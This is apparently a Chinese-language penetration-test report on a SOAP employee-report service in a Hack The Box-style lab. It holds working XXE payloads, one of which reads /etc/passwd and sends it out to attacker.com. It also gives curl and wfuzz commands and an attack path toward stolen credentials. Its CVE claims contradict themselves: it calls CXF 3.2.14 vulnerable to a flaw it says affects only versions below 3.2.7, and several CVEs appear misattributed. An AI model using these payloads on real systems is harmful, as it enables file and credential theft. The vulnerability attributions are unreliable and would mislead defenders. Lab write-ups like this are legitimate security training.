# Employee Service 安全分析报告

**目标**: `http://devarea.htb:8080/employeeservice`
**日期**: 2026-03-29
**分析视角**: 渗透测试

---

## 1. 项目概述

| 项目 | 信息 |
|------|------|
| **服务类型** | SOAP Web Service (JAX-WS) |
| **框架** | Apache CXF 3.2.14 |
| **端口** | 8080 |
| **端点** | `http://devarea.htb:8080/employeeservice` |
| **WSDL** | `http://devarea.htb:8080/employeeservice?wsdl` |
| **主类** | `htb.devarea.ServerStarter` |
| **命名空间** | `http://devarea.htb/` |

### 技术栈

```
Apache CXF 3.2.14 (2019年版本)
├── cxf-rt-frontend-jaxws
├── cxf-rt-databinding-aegis
├── cxf-rt-transports-http-jetty
└── cxf-rt-bindings-soap

Java 8
Jetty Server (嵌入式)
```

---

## 2. WSDL 端点分析

### 2.1 WSDL 结构

```xml
<wsdl:definitions name="EmployeeServiceService" targetNamespace="http://devarea.htb/">
    <wsdl:types>
        <xs:schema elementFormDefault="unqualified" targetNamespace="http://devarea.htb/" version="1.0">
        </xs:schema>
    </wsdl:types>

    <wsdl:message name="submitReport">
        <wsdl:part element="tns:submitReport" name="parameters"></wsdl:part>
    </wsdl:message>

    <wsdl:portType name="EmployeeService">
        <wsdl:operation name="submitReport">
            <wsdl:input message="tns:submitReport" name="submitReport"></wsdl:input>
            <wsdl:output message="tns:submitReportResponse" name="submitReportResponse"></wsdl:output>
        </wsdl:operation>
    </wsdl:portType>

    <wsdl:binding name="EmployeeServiceServiceSoapBinding" type="tns:EmployeeService">
        <soap:binding style="document" transport="http://schemas.xmlsoap.org/soap/http"/>
        <wsdl:operation name="submitReport">
            <soap:operation soapAction="" style="document"/>
            <wsdl:input name="submitReport"><soap:body use="literal"/></wsdl:input>
            <wsdl:output name="submitReportResponse"><soap:body use="literal"/></wsdl:output>
        </wsdl:operation>
    </wsdl:binding>

    <wsdl:service name="EmployeeServiceService">
        <wsdl:port binding="tns:EmployeeServiceServiceSoapBinding" name="EmployeeServicePort">
            <soap:address location="http://devarea.htb:8080/employeeservice"/>
        </wsdl:port>
    </wsdl:service>
</wsdl:definitions>
```

### 2.2 关键发现

| 发现项 | 描述 | 风险等级 |
|--------|------|----------|
| SOAPAction为空 | `<soap:operation soapAction="" />` | 中 |
| document/literal风格 | 直接解析XML，XXE风险 | 高 |
| 命名空间暴露域名 | `devarea.htb` 泄露内网域名 | 低 |

---

## 3. 服务实现分析

### 3.1 核心业务逻辑

**EmployeeServiceImpl.submitReport():**

```java
public String submitReport(Report report) {
    if (report.isConfidential()) {
        return "Report marked confidential. Thank you, " + report.getEmployeeName();
    }
    return "Report received from " + report.getEmployeeName()
         + ". Department: " + report.getDepartment()
         + ". Content: " + report.getContent();
}
```

**Report 数据模型:**

```java
public class Report {
    private String employeeName;
    private String department;
    private String content;
    private boolean confidential;
}
```

### 3.2 攻击面映射

```
┌─────────────────────────────────────────────────────┐
│           submitReport 操作攻击面                    │
├─────────────────────────────────────────────────────┤
│  输入参数:                                          │
│  ├── employeeName (String)  ← XXE/XSS主向量         │
│  ├── department (String)    ← 信息收集              │
│  ├── content (String)       ← XSS/注入风险          │
│  └── confidential (boolean) ← 业务逻辑绕过           │
├─────────────────────────────────────────────────────┤
│  潜在漏洞:                                          │
│  ├── XXE 注入 (XML外部实体)                         │
│  ├── XSS (内容反射显示)                             │
│  ├── SQL注入 (数据存储)                             │
│  ├── XML注入 (消息篡改)                             │
│  └── 业务逻辑绕过 (confidential)                    │
└─────────────────────────────────────────────────────┘
```

---

## 4. 漏洞评级

| 评级 | 数量 | 漏洞类型 |
|------|------|----------|
| 🔴 **严重** | 3 | 无认证、XXE漏洞、内域信息泄露 |
| 🟠 **高危** | 2 | CXF历史漏洞、敏感数据暴露 |
| 🟡 **中危** | 3 | 输入验证缺失、SOAPAction为空、WSDL暴露 |
| 🔵 **低危** | 2 | 错误信息详细、监听所有接口 |

---

## 5. 漏洞详情

### 5.1 🔴 无认证/授权机制

**CVE**: N/A (设计缺陷)
**CVSS**: 9.8 (Critical)

**描述:**
服务直接暴露在网络上，提交报告功能没有任何认证机制。

**代码位置:**
```java
// ServerStarter.java
JaxWsServerFactoryBean factory = new JaxWsServerFactoryBean();
factory.setServiceClass(EmployeeService.class);
factory.setServiceBean(new EmployeeServiceImpl());
factory.setAddress("http://0.0.0.0:8080/employeeservice");
factory.create();
```

**影响:**
- 任何人可直接调用 `submitReport()` 提交报告
- 可批量收集企业信息
- 可能导致数据泄露

**利用:**
```bash
curl -X POST "http://devarea.htb:8080/employeeservice" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <tns:submitReport xmlns:tns="http://devarea.htb/">
      <tns:arg0>
        <tns:employeeName>Attacker</tns:employeeName>
        <tns:department>Pentest</tns:department>
        <tns:content>Malicious report</tns:content>
        <tns:confidential>false</tns:confidential>
      </tns:arg0>
    </tns:submitReport>
  </soapenv:Body>
</soapenv:Envelope>'
```

**修复建议:**
- 实现 WS-Security (用户名令牌)
- 添加 HTTP Basic Auth
- 部署API网关进行认证

---

### 5.2 🔴 Apache CXF XXE 注入 (CVE-2018-8039)

**CVE**: CVE-2018-8039
**CVSS**: 8.1 (High)
**影响版本**: Apache CXF < 3.2.7

**描述:**
Apache CXF 在处理SOAP消息时未正确禁用XML外部实体(XXE)，允许攻击者读取服务器文件。

**测试payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <tns:submitReport xmlns:tns="http://devarea.htb/">
      <tns:arg0>
        <tns:employeeName>&xxe;</tns:employeeName>
        <tns:department>IT</tns:department>
        <tns:content>test</tns:content>
        <tns:confidential>false</tns:confidential>
      </tns:arg0>
    </tns:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
```

**带外XXE利用:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM \'http://attacker.com/?data=%xxe;\'>">
  %eval;
  %exfil;
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <tns:submitReport xmlns:tns="http://devarea.htb/">
      <tns:arg0>
        <tns:employeeName>TEST</tns:employeeName>
      </tns:arg0>
    </tns:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
```

**修复建议:**
- 升级 Apache CXF 到 3.2.7+
- 配置 XMLInputFactory 禁用外部实体

---

### 5.3 🔴 Apache CXF 认证绕过 (CVE-2019-12402)

**CVE**: CVE-2019-12402
**CVSS**: 8.1 (High)

**描述:**
使用 WebSphere 的 JAX-RS 和 CXF 结合时，认证可被绕过。

**修复建议:**
- 升级 Apache CXF 到最新版本
- 避免使用 WebSphere 的 JAX-RS

---

### 5.4 🟠 敏感数据直接返回

**CWE**: CWE-200
**CVSS**: 7.5 (High)

**描述:**
非机密报告直接拼接返回员工姓名、部门、内容。

**代码位置:**
```java
return "Report received from " + report.getEmployeeName()
     + ". Department: " + report.getDepartment()
     + ". Content: " + report.getContent();
```

**影响:**
- 攻击者可收集企业内部信息
- 员工隐私泄露
- 社会工程学攻击素材

**修复建议:**
- 返回报告ID而非完整内容
- 添加访问控制

---

### 5.5 🟠 旧版框架历史漏洞

**CVE列表:**

| CVE | 漏洞类型 | CVSS | 影响版本 |
|-----|---------|------|----------|
| CVE-2019-12402 | 认证绕过 | 8.1 | < 3.3.0 |
| CVE-2018-8039 | XXE注入 | 8.1 | < 3.2.7 |
| CVE-2017-7656 | 拒绝服务 | 7.5 | < 3.2.0 |

**当前版本:** Apache CXF 3.2.14 (2019年发布)

**修复建议:**
- 升级到 CXF 3.6.x (最新稳定版)

---

### 5.6 🟡 SOAPAction 空值

**CWE**: CWE-346
**CVSS**: 5.0 (Medium)

**描述:**
WSDL中 SOAPAction 为空字符串，服务端可能不验证此头。

```xml
<soap:operation soapAction="" style="document"/>
```

**攻击路径:**
- SOAPAction Spoofing 攻击
- 绕过某些安全设备

**测试:**
```bash
curl -X POST "http://devarea.htb:8080/employeeservice" \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: malicious" \
  -d '...'
```

---

### 5.7 🟡 缺乏输入验证

**CWE**: CWE-20
**CVSS**: 5.0 (Medium)

**描述:**
Report 字段无长度或内容限制。

```java
private String employeeName;   // 无验证
private String department;     // 无验证
private String content;        // 无验证
```

**攻击向量:**
- XSS (内容被反射显示)
- SQL注入 (数据存储)
- 缓冲区问题 (超长字符串)

**修复建议:**
- 添加 @Size, @Pattern 注解
- 服务端二次校验

---

### 5.8 🔵 详细错误信息

**CWE**: CWE-209
**CVSS**: 4.0 (Low)

**描述:**
响应消息包含过多细节。

```
"Report received from John. Department: IT. Content: ..."
```

**修复建议:**
- 统一错误响应
- 日志记录而非返回

---

## 6. 攻击路径图

```
┌─────────────────────────────────────────────────────────────┐
│                     完整攻击路径                              │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. [信息收集]                                               │
│     ├─> nmap -p 8080 devarea.htb                            │
│     ├─> 获取WSDL: /employeeservice?wsdl                      │
│     └─> 分析命名空间: devarea.htb                            │
│                                                              │
│  2. [漏洞探测]                                               │
│     ├─> XXE测试 (CVE-2018-8039)                             │
│     ├─> SOAPAction绕过                                      │
│     └─> 输入验证绕过                                         │
│                                                              │
│  3. [漏洞利用]                                               │
│     ├─> 无认证 → 直接调用submitReport                        │
│     ├─> XXE → 读取服务器文件                                 │
│     │   ├─> /etc/passwd                                     │
│     │   ├─> /proc/self/environ                              │
│     │   └─> 应用配置文件                                     │
│     └─> 认证绕过 → 绕过安全控制                              │
│                                                              │
│  4. [权限提升/横向移动]                                      │
│     ├─> XXE读取密钥/凭证                                    │
│     ├─> 利用凭证横向移动                                     │
│     └─> 获取管理员权限                                       │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## 7. 渗透测试 Checklist

### 信息收集
- [ ] 端口扫描: `nmap -p 8080 devarea.htb`
- [ ] WSDL获取: `curl http://devarea.htb:8080/employeeservice?wsdl`
- [ ] 目录枚举: `/admin`, `/manager`, `/employeeservice/`
- [ ] HTTP方法测试: OPTIONS, GET, POST, PUT, DELETE

### XXE 测试
- [ ] 基本XXE: `file:///etc/passwd`
- [ ] Blind XXE: 外带数据通道
- [ ] XXE读取: `/proc/self/environ`, `file:///etc/hostname`
- [ ] XXE+DTD延迟: 测试递归实体

### SOAP 特定测试
- [ ] SOAPAction 空值绕过
- [ ] SOAPAction 头篡改
- [ ] XML注入: `]]>` 字符
- [ ] 恶意XML: 递归实体

### 业务逻辑测试
- [ ] `confidential=true/false` 参数篡改
- [ ] 多次提交测试 (IDOR)
- [ ] 特殊字符: `'`, `"`, `<`, `>`, `&`, `;`
- [ ] 空值测试: employeeName 为空

### 模糊测试
```bash
# 使用 Burp Intruder 或 wfuzz
wfuzz -c -z file,wordlist.txt \
  --hc 404,500 \
  "http://devarea.htb:8080/employeeservice?FUZZ=test"
```

---

## 8. 修复建议优先级

| 优先级 | 漏洞 | 修复方案 | 难度 |
|--------|------|----------|------|
| **P0** | 无认证 | 实现WS-Security或API Key认证 | 中 |
| **P0** | XXE漏洞 | 升级CXF到3.3.0+ | 低 |
| **P1** | 输入验证 | 添加@Size/@Pattern注解 | 低 |
| **P1** | 敏感数据泄露 | 响应返回报告ID而非内容 | 中 |
| **P2** | SOAPAction | 验证SOAPAction头 | 低 |
| **P2** | 接口暴露 | 改为127.0.0.1绑定 | 低 |
| **P3** | 错误信息 | 统一错误响应格式 | 低 |

---

## 9. 参考链接

- [CVE-2018-8039 Details](https://nvd.nist.gov/vuln/detail/CVE-2018-8039)
- [CVE-2019-12402 Details](https://nvd.nist.gov/vuln/detail/CVE-2019-12402)
- [OWASP XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [Apache CXF Security](https://cxf.apache.org/docs/security.html)

---

**报告结束**
